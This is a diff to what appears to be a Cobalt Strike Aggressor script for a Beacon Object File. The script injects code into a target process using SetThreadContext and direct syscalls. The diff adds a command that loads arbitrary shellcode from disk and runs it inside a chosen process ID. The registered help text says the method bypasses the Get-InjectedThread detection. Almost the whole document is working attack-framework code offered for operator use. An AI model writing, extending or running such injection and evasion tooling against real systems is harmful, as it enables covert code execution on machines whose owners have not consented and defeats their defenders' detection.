@@ -2,11 +2,28 @@
 # Apr 2021
 # $1 = beacon ID
 # $2 = pid
-# scp * 192.168.122.130:/root/BeaconObjectFile/syscall_stcinject
-# x86_64-w64-mingw32-gcc -c syscall_stcinject.c -o syscall_stcinject.x64.o
-# i686-w64-mingw32-gcc -c syscall_stcinject.c -o syscall_stcinject.x86.o
 # x86_64-w64-mingw32-gcc -c syscall_stcinject.c -o syscall_stcinject.o
 
+alias syscall_stc_shinject {
+	local('$handle $data $args $sc_data');
+	
+	# read in the right BOF file
+	$handle = openf(script_resource("syscall_stcinject.o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	$sc_handle = openf($3);
+	$sc_data = readb($sc_handle, -1);
+	closef($sc_handle);
+
+	# pack our arguments
+	$args = bof_pack($1, "ib", $2, $sc_data);
+	
+	btask($1, "Reading shellcode from: $+  $3");
+
+	# execute it.
+	beacon_inline_execute($1, $data, "go", $args);
+}
 
 alias syscall_stcinject {
 	local('$bid $handle $data $pid $listener $payload');
@@ -55,5 +72,7 @@ alias syscall_stcinject {
 		beacon_inline_execute($1, $data, "go", $args);
 	}
 }
-beacon_command_register("syscall_stcinject", "XPN's SetThreadContext injection method with direct syscalls.", "Synopsis: syscall_stcinject [pid] [listener] \n\nBased on Adam Chester's method to bypass Get-InjectedThread\nThe SetThreadContext method.");
+beacon_command_register("syscall_stcinject", "XPN's SetThreadContext injection method with direct syscalls.", "Synopsis: syscall_stcinject [pid] [listener] \n\nBased on XPN's method to bypass Get-InjectedThread\nThe SetThreadContext method.");
+
+beacon_command_register("syscall_stc_shinject", "Direct syscalls to execute custom shellcode (.bin) from disk.", "Synopsis: syscall_stc_shinject [pid] [path/to/payload.bin] \n\nBased on XPN's method to bypass Get-InjectedThread\nThe SetThreadContext method using custom shellcode from disk.\nOption: From dll to .bin with SRDI.");
 
